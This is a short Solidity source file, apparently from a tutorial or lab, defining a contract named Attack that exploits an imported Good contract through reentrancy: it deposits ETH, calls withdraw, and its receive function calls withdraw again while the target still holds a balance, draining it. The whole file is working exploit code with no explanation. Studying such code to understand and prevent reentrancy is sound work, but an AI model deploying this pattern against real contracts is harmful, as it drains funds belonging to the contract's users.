// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.20;
import './Good.sol';

contract Attack{
    
    Good public goodContract;
    constructor(address _good){
        goodContract = Good(_good);
    }

    receive() external payable{
        if(address(goodContract).balance >0){
            goodContract.withdraw();
        }
    }

    function attack() public payable {
        goodContract.addEth{value : msg.value}();
        goodContract.withdraw();
    }
    

}